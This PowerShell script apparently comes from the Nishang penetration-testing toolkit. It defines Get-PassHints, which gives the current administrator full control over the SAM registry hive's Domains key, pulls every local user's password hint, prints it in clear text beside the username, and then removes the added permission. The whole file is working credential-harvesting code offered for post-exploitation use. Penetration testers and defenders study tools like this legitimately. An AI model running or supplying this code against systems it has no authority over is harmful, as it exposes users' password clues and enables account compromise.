function Get-PassHints {
<# 
.SYNOPSIS 
Nishang script which extracts password hint for users in clear text.
 
.DESCRIPTION 
The script extracts password hints from SAM registry hive. The script needs Administrator privs to read SAM hive.

.EXAMPLE 
PS > Get-PassHints
 
.LINK 
http://www.labofapenetrationtester.com/2015/09/extracting-windows-users-password-hints.html
https://github.com/samratashok/nishang
#>

[CmdletBinding()]
Param ()

    #Set permissions to allow Access to SAM\SAM\Domains registry hive.
    #http://www.labofapenetrationtester.com/2013/05/poshing-hashes-part-2.html?showComment=1386725874167#c8513980725823764060
    $rule = New-Object System.Security.AccessControl.RegistryAccessRule (
    [System.Security.Principal.WindowsIdentity]::GetCurrent().Name,
    "FullControl",
    [System.Security.AccessControl.InheritanceFlags]"ObjectInherit,ContainerInherit",
    [System.Security.AccessControl.PropagationFlags]"None",
    [System.Security.AccessControl.AccessControlType]"Allow")
    $key = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey(
    "SAM\SAM\Domains",
    [Microsoft.Win32.RegistryKeyPermissionCheck]::ReadWriteSubTree,
    [System.Security.AccessControl.RegistryRights]::ChangePermissions)
    $acl = $key.GetAccessControl()
    $acl.SetAccessRule($rule)
    $key.SetAccessControl($acl)

    #From powerdump from SET
    function Get-UserName([byte[]]$V)
    {
        if (-not $V) {return $null};
        $offset = [BitConverter]::ToInt32($V[0x0c..0x0f],0) + 0xCC;
        $len = [BitConverter]::ToInt32($V[0x10..0x13],0);
        return [Text.Encoding]::Unicode.GetString($V, $offset, $len);
    }
    

    #Logic for extracting password hint
    $users = Get-ChildItem HKLM:\SAM\SAM\Domains\Account\Users\
    $j = 0
    foreach ($key in $users)
    {

        $value = Get-ItemProperty $key.PSPath
        $j++
        foreach ($hint in $value)
        {
            #Check for users who have passwordhint
            if ($hint.UserPasswordHint)
            {
                $username = Get-UserName($hint.V)
                $passhint = ([text.encoding]::Unicode).GetString($hint.UserPasswordHint)
                Write-Output "$username`:$passhint"
            }
        }
    }

    #Remove the permissions added above.
    $user = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
    $acl.Access | where {$_.IdentityReference.Value -eq $user} | %{$acl.RemoveAccessRule($_)} | Out-Null
    Set-Acl HKLM:\SAM\SAM\Domains $acl
}

